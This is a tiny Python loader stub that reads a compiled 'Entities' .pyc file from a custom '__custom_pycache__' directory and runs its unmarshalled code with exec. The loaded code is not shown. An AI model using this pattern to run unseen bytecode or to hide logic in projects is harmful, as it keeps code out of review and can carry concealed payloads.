
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Entities_1935acc162b14737aa63ed0774e70d4e.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
